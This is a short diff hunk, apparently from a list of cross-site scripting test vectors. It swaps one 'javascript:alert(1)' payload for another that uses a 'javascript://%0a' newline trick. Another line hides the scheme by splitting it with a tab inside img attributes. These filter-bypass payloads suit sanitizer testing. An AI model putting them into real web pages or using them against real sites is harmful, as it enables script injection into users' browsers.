@@ -2,4 +2,4 @@
 
 <img src="javas	cript:alert(1)" width="javas	cript:alert(1)">
 
-<math><x href="javascript:alert(1)">blah
+<a href="javascript://%0aalert(1)">XSS</a>
